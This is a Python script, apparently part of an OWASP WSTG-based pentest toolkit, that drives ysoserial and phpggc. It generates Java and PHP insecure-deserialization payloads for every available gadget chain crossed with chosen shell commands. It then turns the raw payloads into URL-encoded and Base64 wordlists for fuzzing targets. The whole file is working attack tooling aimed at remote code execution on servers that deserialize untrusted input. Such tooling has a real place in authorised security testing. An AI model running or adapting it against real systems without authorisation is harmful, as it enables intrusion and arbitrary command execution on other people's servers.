#!/usr/bin/env python3
"""
WSTG-INJT-23 (Insecure Deserialization) - ysoserial / phpggc wrapper.

One script, two underlying tools, picked by --language:

    --language java   -> shells out to ysoserial (Java gadget chains)
    --language php    -> shells out to phpggc   (PHP gadget chains)

Flags
-----
    --project-root   Project directory (required).
    --language       php | java (required). Chooses the underlying tool.
    --sys-type       linux | windows (required). Chooses which command list
                      file this run reads by default: Inputs/Data/linux.txt
                      or Inputs/Data/windows.txt, inside this item's own
                      WSTG-INJT-23 folder (found by scanning the project, the
                      same way every other per-item script here does it -
                      never a hardcoded category path).
    --command        One command to test, e.g. "id" or "whoami". Optional.
    --command-list   Override: an explicit path to a file of commands (one
                      per line, blank lines and lines starting with # are
                      skipped). Optional - normally the linux.txt/windows.txt
                      implied by --sys-type is used instead; this just lets
                      you point at a different file without renaming it.
    --gadget         Restrict this run to exactly one gadget chain by name
                      (e.g. "CommonsCollections6" or "Laravel/RCE1") instead
                      of the default, which is every gadget chain the
                      underlying tool reports on its own gadget list.
    --ysoserial-bin  Command to run for ysoserial (default: "ysoserial", the
                      name Kali's ysoserial package puts on PATH).
    --ysoserial-jar  Alternative to --ysoserial-bin: run "java -jar <jar>"
                      instead, for a bare ysoserial-all.jar with no wrapper
                      script installed.
    --phpggc-bin     Command to run for phpggc (default: "phpggc").
    --timeout        Per gadget-x-command subprocess timeout, in seconds
                      (default 20).

--command and --command-list are additive, not either/or: every command from
both sources is tried, same as the original ask ("Command, for the inevitable
command to test" plus "Command_list, in case I want many commands to try").

Gadget chains and commands are deliberately crossed: every gadget this run
is using gets tried against every command collected, and a combination that
fails (wrong argument shape for that particular gadget, missing dependency
jar, etc.) is skipped with a one-line reason and does NOT stop the run - a
gadget chain needing a different calling convention than a bare command
string is an expected, not exceptional, outcome when sweeping "every gadget"
rather than one you already know fits.

Output pipeline (always in this order, no flag changes it):
  1. Every successful gadget x command run's raw serialized bytes are saved
     first, as-is, to Outputs/test_outputs/raw/<gadget>__cmd<NN>.bin.
  2. Every .bin file under that raw/ folder (from this run AND any earlier
     run - raw files accumulate across --language/--sys-type toggles) is
     then read back and turned into two plain wordlists, one URL-encoded
     line per raw file and one Base64 line per raw file:
       Outputs/test_outputs/WSTG-INJT-23_url_WL.txt
       Outputs/test_outputs/WSTG-INJT-23_b64_WL.txt
     Both variants are produced unconditionally for both languages - there
     is no --encoding flag. Neither tool's own native encoding flags
     (phpggc's --base64/--url) are used; this script derives both itself
     from the raw bytes so Java and PHP payloads end up in the exact same
     shape.
  Those two files are rewritten in full each run (they are a derived view
  of whatever is in raw/ right now), so re-running after generating more
  raw material just picks up the new files too - nothing needs --force.

Usage
-----
    python3 deser_wordlist.py --project-root ... --language java --sys-type linux
    python3 deser_wordlist.py --project-root ... --language php --sys-type windows --command id
    python3 deser_wordlist.py --project-root ... --language java --sys-type linux --gadget CommonsCollections6

Neither ysoserial nor phpggc ships with this app - they are expected to
already be on the operator's own box (Kali ships both as packages). This
script was written and exercised against documented CLI behavior for both
tools; it has not been run against the real binaries in the environment
this app was built in, since neither was installed there. Smoke-test it
once against your own install before relying on it.
"""
import argparse
import base64
import os
import re
import shutil
import subprocess
import sys
import urllib.parse

SELF_ID = "WSTG-INJT-23"
DEFAULT_TIMEOUT = 20


def find_item_folder(project_root, wstg_id):
    """Scan the project tree for the one folder named after wstg_id - never a
    hardcoded category path, since category folder names/numbers do drift
    (and have, elsewhere in this project) while the WSTG ID itself doesn't."""
    wstg_id = wstg_id.strip().upper()
    for root, dirs, _files in os.walk(project_root):
        for d in dirs:
            if d.strip().upper() == wstg_id:
                return os.path.join(root, d)
    return None


def atomic_write_text(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(text)
    os.replace(tmp, path)


def atomic_write_bytes(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + ".tmp"
    with open(tmp, "wb") as f:
        f.write(data)
    os.replace(tmp, path)


def sanitize_gadget(name):
    return re.sub(r"[^A-Za-z0-9_.-]", "_", name)


def load_command_list(path):
    commands = []
    if not path or not os.path.isfile(path):
        return commands, False
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            commands.append(line)
    return commands, True


def collect_commands(args, self_dir):
    commands = []
    seen = set()

    def add(cmd):
        if cmd and cmd not in seen:
            seen.add(cmd)
            commands.append(cmd)

    if args.command:
        add(args.command)

    list_path = args.command_list
    auto = False
    if not list_path:
        list_path = os.path.join(self_dir, "Inputs", "Data", f"{args.sys_type}.txt")
        auto = True

    found_commands, list_found = load_command_list(list_path)
    for c in found_commands:
        add(c)

    print(
        f"[info] command list: {list_path}"
        f" ({'found' if list_found else 'not found'}{', auto-selected by --sys-type' if auto else ''})",
        flush=True,
    )
    return commands, list_path, list_found


# -------------------------- gadget discovery -------------------------------

_HEADER_WORDS = {"payload", "name", "gadget", "type", "vector", "information", "authors", "dependencies"}


def _run_capture(cmd, timeout):
    """Run a command, tolerating a nonzero exit (both tools exit non-zero when
    just printing their gadget list / usage with no further arguments)."""
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=timeout)
    except FileNotFoundError as e:
        raise RuntimeError(f"could not run {cmd[0]!r}: {e}") from e
    out = (proc.stdout or b"") + b"\n" + (proc.stderr or b"")
    return out.decode("utf-8", errors="replace")


def discover_ysoserial_gadgets(ysoserial_cmd, timeout):
    text = _run_capture(ysoserial_cmd, timeout)
    gadgets = []
    seen = set()
    for line in text.splitlines():
        m = re.match(r"^\s{2,}([A-Za-z][A-Za-z0-9_.]*)\s{2,}\S", line)
        if not m:
            continue
        name = m.group(1)
        if name.lower() in _HEADER_WORDS or set(name) == {"-"}:
            continue
        if name not in seen:
            seen.add(name)
            gadgets.append(name)
    return gadgets


def discover_phpggc_gadgets(phpggc_bin, timeout):
    gadgets = []
    seen = set()
    for list_flag in ("-l", "--list"):
        text = _run_capture([phpggc_bin, list_flag], timeout)
        for line in text.splitlines():
            m = re.match(r"^\s*([A-Za-z0-9_]+/[A-Za-z0-9_]+)\b", line)
            if not m:
                continue
            name = m.group(1)
            if name not in seen:
                seen.add(name)
                gadgets.append(name)
        if gadgets:
            break
    return gadgets


# ------------------------------ runners -------------------------------------

def run_ysoserial(ysoserial_cmd, gadget, command, timeout):
    try:
        proc = subprocess.run(ysoserial_cmd + [gadget, command], capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None, "timed out"
    if proc.returncode != 0 or not proc.stdout:
        reason = (proc.stderr or b"").decode("utf-8", errors="replace").strip().splitlines()
        return None, (reason[-1] if reason else f"exit code {proc.returncode}, no output")
    return proc.stdout, None


def run_phpggc(phpggc_bin, gadget, command, timeout):
    try:
        proc = subprocess.run([phpggc_bin, gadget, command], capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None, "timed out"
    if proc.returncode != 0 or not proc.stdout:
        reason = (proc.stderr or b"").decode("utf-8", errors="replace").strip().splitlines()
        return None, (reason[-1] if reason else f"exit code {proc.returncode}, no output")
    return proc.stdout, None


# ------------------------------- main ----------------------------------------

def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--project-root", required=True, help="Project directory.")
    ap.add_argument("--language", required=True, choices=["php", "java"])
    ap.add_argument("--sys-type", required=True, choices=["linux", "windows"])
    ap.add_argument("--command", default=None, help="One command to test.")
    ap.add_argument("--command-list", default=None, help="Override path to a command-list file.")
    ap.add_argument("--gadget", default=None, help="Restrict to one gadget chain instead of every one the tool reports.")
    ap.add_argument("--ysoserial-bin", default="ysoserial")
    ap.add_argument("--ysoserial-jar", default=None)
    ap.add_argument("--phpggc-bin", default="phpggc")
    ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    args = ap.parse_args()

    project_root = os.path.abspath(args.project_root)
    if not os.path.isdir(project_root):
        print(f"[error] --project-root is not a directory: {project_root}", file=sys.stderr)
        sys.exit(1)

    self_dir = find_item_folder(project_root, SELF_ID)
    if not self_dir:
        print(f"[error] no folder found for {SELF_ID} under {project_root}", file=sys.stderr)
        sys.exit(1)

    commands, list_path, list_found = collect_commands(args, self_dir)
    if not commands:
        print(
            f"[error] no commands to test - pass --command, or put one-per-line commands in "
            f"{list_path} (the file implied by --sys-type {args.sys_type}).",
            file=sys.stderr,
        )
        sys.exit(1)
    print(f"[info] {len(commands)} command(s): {', '.join(commands)}", flush=True)

    raw_dir = os.path.join(self_dir, "Outputs", "test_outputs", "raw")
    out_url = os.path.join(self_dir, "Outputs", "test_outputs", f"{SELF_ID}_url_WL.txt")
    out_b64 = os.path.join(self_dir, "Outputs", "test_outputs", f"{SELF_ID}_b64_WL.txt")

    if args.language == "java":
        ysoserial_cmd = ["java", "-jar", args.ysoserial_jar] if args.ysoserial_jar else [args.ysoserial_bin]
        probe_bin = args.ysoserial_jar if args.ysoserial_jar else args.ysoserial_bin
        if args.ysoserial_jar:
            if not os.path.isfile(args.ysoserial_jar):
                print(f"[error] --ysoserial-jar not found: {args.ysoserial_jar}", file=sys.stderr)
                sys.exit(1)
            if not shutil.which("java"):
                print("[error] 'java' is not on PATH - needed to run --ysoserial-jar.", file=sys.stderr)
                sys.exit(1)
        elif not shutil.which(args.ysoserial_bin):
            print(
                f"[error] {args.ysoserial_bin!r} is not on PATH. Install ysoserial (e.g. "
                f"'apt install ysoserial' on Kali) or pass --ysoserial-jar /path/to/ysoserial-all.jar.",
                file=sys.stderr,
            )
            sys.exit(1)

        if args.gadget:
            gadgets = [args.gadget]
        else:
            print("[info] discovering ysoserial gadget chains...", flush=True)
            try:
                gadgets = discover_ysoserial_gadgets(ysoserial_cmd, args.timeout)
            except RuntimeError as e:
                print(f"[error] {e}", file=sys.stderr)
                sys.exit(1)
            if not gadgets:
                print(
                    "[error] could not auto-discover any gadget chains from ysoserial's own output "
                    "(the listing format may differ for this build) - pass --gadget explicitly.",
                    file=sys.stderr,
                )
                sys.exit(1)
        print(f"[info] {len(gadgets)} gadget chain(s): {', '.join(gadgets)}", flush=True)

        runner = lambda g, c: run_ysoserial(ysoserial_cmd, g, c, args.timeout)

    else:  # php
        if not shutil.which(args.phpggc_bin):
            print(
                f"[error] {args.phpggc_bin!r} is not on PATH. Install phpggc (e.g. clone "
                f"https://github.com/ambionics/phpggc) or pass --phpggc-bin /path/to/phpggc.",
                file=sys.stderr,
            )
            sys.exit(1)

        if args.gadget:
            gadgets = [args.gadget]
        else:
            print("[info] discovering phpggc gadget chains...", flush=True)
            try:
                gadgets = discover_phpggc_gadgets(args.phpggc_bin, args.timeout)
            except RuntimeError as e:
                print(f"[error] {e}", file=sys.stderr)
                sys.exit(1)
            if not gadgets:
                print(
                    "[error] could not auto-discover any gadget chains from phpggc's own -l/--list output "
                    "(the listing format may differ for this build) - pass --gadget explicitly.",
                    file=sys.stderr,
                )
                sys.exit(1)
        print(f"[info] {len(gadgets)} gadget chain(s): {', '.join(gadgets)}", flush=True)

        runner = lambda g, c: run_phpggc(args.phpggc_bin, g, c, args.timeout)

    made = 0
    skipped = 0
    for gadget in gadgets:
        for i, command in enumerate(commands):
            raw, reason = runner(gadget, command)
            if raw is None:
                print(f"[skip] {gadget} x {command!r}: {reason}", flush=True)
                skipped += 1
                continue
            raw_path = os.path.join(raw_dir, f"{sanitize_gadget(gadget)}__cmd{i:02d}.bin")
            atomic_write_bytes(raw_path, raw)
            made += 1
            print(f"[+] {raw_path} ({len(raw)} bytes)", flush=True)

    print(f"[info] this run: {made} raw payload(s) saved, {skipped} gadget x command combination(s) skipped.", flush=True)

    # Rebuild both wordlists from EVERY .bin file currently under raw/, not just this run's -
    # raw/ accumulates across --language/--sys-type toggles, and the wordlists are a derived
    # view of it, always covering both languages' raw material uniformly.
    raw_files = sorted(f for f in os.listdir(raw_dir) if f.endswith(".bin")) if os.path.isdir(raw_dir) else []
    if not raw_files:
        print("[error] no raw .bin files to encode (none saved this run, and none from an earlier run).", file=sys.stderr)
        sys.exit(1)

    url_lines = []
    b64_lines = []
    for name in raw_files:
        with open(os.path.join(raw_dir, name), "rb") as f:
            data = f.read()
        url_lines.append(urllib.parse.quote_from_bytes(data, safe=""))
        b64_lines.append(base64.b64encode(data).decode("ascii"))

    atomic_write_text(out_url, "\n".join(url_lines) + "\n")
    atomic_write_text(out_b64, "\n".join(b64_lines) + "\n")
    print(f"[+] {out_url} <- {len(url_lines)} entries (from {len(raw_files)} raw file(s) total)", flush=True)
    print(f"[+] {out_b64} <- {len(b64_lines)} entries (from {len(raw_files)} raw file(s) total)", flush=True)


if __name__ == "__main__":
    main()
